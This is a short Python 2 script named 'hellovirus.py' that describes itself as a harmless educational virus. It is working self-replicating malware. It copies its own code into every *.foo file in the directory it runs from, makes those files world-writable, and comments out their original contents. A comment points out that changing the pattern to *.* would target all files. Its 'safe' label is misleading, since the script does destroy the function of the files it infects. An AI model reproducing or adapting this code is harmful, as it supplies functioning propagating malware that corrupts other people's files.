#!/usr/bin/python
import os,sys, glob, string

# hellovirus.py

FILETYPE = '*.foo' # use *.* for all files in directory

print '''\nHELLO FROM HELLOVIRUS\n
This is a demonstration of how easy it is to write
a self-replicating program. This virus will infect
all files with names ending in FILETYPE in the directory in
which you execute an infected file. If you send an
infected file to someone else and they execute it, their
FILETYPE files will be damaged also.\n
Note that this is a safe virus (for educational purposes
only) since it does not carry a harmful payload. All it
does is prints out this message and comment out the
code in FILETYPE files.\n'''

IN = open(sys.argv[0], "r")
virus = ''
for i in range(0, 34):
	virus += IN.readline()

for myfile in glob.glob('*.foo'):
	IN = open(myfile, 'r')
	all_of_it = IN.read()
	IN.close()
	if 'hellovirus' in ''.join(all_of_it):
		continue
	os.chmod(myfile, 511)
	OUT = open(myfile, 'w')
	OUT.write(virus)
	OUT.write(filter(lambda x: x in string.printable, ('#'.join(('\n'+all_of_it.lstrip()).splitlines(True)))))
	OUT.close()